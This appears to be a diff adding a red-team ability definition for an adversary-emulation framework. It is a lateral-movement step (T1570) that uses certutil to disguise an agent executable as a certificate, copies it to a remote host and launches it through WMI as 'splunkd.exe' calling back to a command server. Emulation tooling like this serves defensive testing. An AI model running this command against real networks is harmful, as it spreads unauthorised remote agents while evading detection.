@@ -1,0 +1,46 @@
+- repeatable: false
+  name: Lateral Movement - Certutil
+  additional_info:
+    cleanup: '[]'
+  technique_name: Lateral Tool Transfer
+  executors:
+  - name: psh
+    additional_info: {}
+    variations: []
+    platform: windows
+    command: 'certutil -encode #{location} C:\users\public\com.crt | out-null;
+
+      invoke-command #{remote.host.fqdn} -scriptblock { certutil -decode \\#{local.host.fqdn}\c$\users\public\com.crt
+      #{location}; invoke-wmimethod -computername . -class win32_process -name Create
+      -argumentlist "C:\users\public\splunkd.exe -server #{server}
+      -group red" }
+
+      '
+    code: null
+    language: null
+    payloads: []
+    timeout: 60
+    parsers: []
+    cleanup:
+    - rm C:\users\public\com.crt
+    uploads: []
+    build_target: null
+  buckets: []
+  technique_id: T1570
+  delete_payload: true
+  tactic: lateral-movement
+  description: Uses CertUtil as a LoL technique to move the .exe agent as a certificate
+    using windows-signed binaries
+  singleton: true
+  plugin: ''
+  requirements:
+  - module: plugins.stockpile.app.requirements.not_exists
+    relationship_match:
+    - source: remote.host.fqdn
+      edge: has_agent_copy
+  - module: plugins.stockpile.app.requirements.no_backwards_movement
+    relationship_match:
+    - source: remote.host.fqdn
+  privilege: ''
+  access: {}
+  id: 96d3c175-5e58-424c-8350-d7514b28a075
